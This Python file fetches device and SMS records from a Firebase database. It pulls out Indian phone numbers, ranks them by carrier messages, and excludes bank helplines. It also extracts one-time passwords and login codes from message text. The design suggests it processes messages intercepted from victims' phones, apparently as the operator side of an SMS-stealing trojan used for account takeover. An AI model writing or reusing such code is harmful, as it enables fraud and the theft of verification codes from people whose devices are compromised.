import aiohttp, json, re, base64
from collections import Counter

async def fetch_fb(url, auth=None):
    full_url = url
    if auth: full_url += f"?auth={auth}" if "?" not in full_url else f"&auth={auth}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(full_url, timeout=10) as resp:
                if resp.status == 200:
                    txt = await resp.text()
                    if txt == "null" or not txt: return {}
                    return json.loads(txt)
    except Exception: pass
    return None

def extract_best_numbers(dev_data, msgs):
    all_text = " ".join([m.get("message", "") for m in msgs])
    # Broad regex for 10 digits
    matches = re.findall(r'(?:\+?91[\-\s]?)?([6-9]\d{9})\b', all_text)
    
    # Filter known bad numbers (Bank helplines)
    bad_numbers = {"9264092640", "18001800", "919951860002", "18001035577"}
    matches = [m for m in matches if m not in bad_numbers]
    
    counts = Counter(matches)
    scored_numbers = []
    
    for num, count in counts.items():
        score = min(count * 15, 60) 
        for m in msgs:
            sender = str(m.get("sender", "")).lower()
            if num in m.get("message", ""):
                if any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]):
                    score += 30
                    break
        scored_numbers.append((num, min(score, 99)))

    # Direct metadata
    for key in ["phoneNumber", "phone", "number", "mobile"]:
        if dev_data.get(key):
            n = re.sub(r'\D', '', str(dev_data[key]))[-10:]
            if len(n) == 10 and n not in bad_numbers: 
                scored_numbers.append((n, 100))
                
    # Sims array
    sims = dev_data.get("sims")
    if isinstance(sims, list):
        for sim in sims:
            if isinstance(sim, dict):
                for key in ["phoneNumber", "number", "phone"]:
                    if sim.get(key):
                        n = re.sub(r'\D', '', str(sim[key]))[-10:]
                        if len(n) == 10 and n not in bad_numbers:
                            scored_numbers.append((n, 100))

    best_nums = {}
    for n, s in scored_numbers:
        if n not in best_nums or s > best_nums[n]: best_nums[n] = s
            
    final_list = sorted(best_nums.items(), key=lambda x: x[1], reverse=True)
    return final_list[:2]

def extract_otp(text):
    if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin", "password"]): return None
    match = re.search(r'\b(\d{4,8})\b', text)
    return match.group(1) if match else None
